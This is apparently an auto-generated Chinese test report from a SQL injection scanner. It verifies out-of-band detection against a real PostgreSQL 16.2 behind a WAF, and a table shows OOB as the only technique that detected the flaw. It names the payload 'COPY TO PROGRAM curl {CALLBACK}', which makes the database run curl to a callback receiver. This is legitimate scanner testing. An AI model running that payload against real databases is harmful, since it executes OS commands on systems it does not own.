# OOB 带外通道真机验证（真实 PostgreSQL 16.2）

> 生成：2026-09-14T04:38:48.018Z　｜　引擎：真实 PostgreSQL 16.2（便携版，超管）　｜　场景：/oob 无回显 + WAF（拦 sleep/报错/union）

| 实验 | 配置 | 检出 | 结论 |
|---|---|---|---|
| OOB 开启 | techniques=[oob] + oob.enabled | oob | ✅ 全链路回连命中 |
| 对照 | 默认四技术 | - | 0 检出（OOB 为唯一可达通道） |

> 全链路：引擎 payload（COPY TO PROGRAM curl {CALLBACK}）→ 靶场 HTTP → PG 进程执行 →
> OS curl 真实回连 127.0.0.1:8899/oob/:token → oobReceiver 捕获 → OobDetector 判定。